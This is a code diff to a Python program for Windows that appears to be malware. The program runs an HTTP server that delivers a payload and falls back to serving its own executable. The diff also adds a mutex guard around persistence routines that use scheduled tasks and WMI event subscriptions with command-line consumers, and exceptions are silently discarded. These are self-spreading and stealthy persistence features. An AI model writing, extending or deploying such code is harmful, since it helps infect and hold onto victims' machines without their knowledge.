@@ -7,6 +7,7 @@ import random
 import string
 import psutil
 import wmi
+import win32event
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -62,8 +63,10 @@ class HTTPHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'application/octet-stream')
             self.end_headers()
-            if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+            if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
             else: payload_path = download_payload()
+            if not payload_path or not os.path.exists(payload_path):
+                payload_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
             with open(payload_path, 'rb') as f:
                 self.wfile.write(f.read())
         elif self.path == '/':
@@ -296,6 +299,16 @@ def persist_process_trigger():
             Filter=f"__EventFilter.Name='{event_filter.Name}'",
             Consumer=f"Win32_CommandLineEventConsumer.Name='{consumer.Name}'"
         )
+    except:
+        pass
+
+# Mutex to prevent duplicate persistence
+def persist_mutex():
+    try:
+        mutex = win32event.CreateMutex(None, False, 'Global\\HTTPServerMutex')
+        if win32event.GetLastError() == 0:
+            persist_schtasks()
+            persist_process_trigger()
     except:
         pass
 
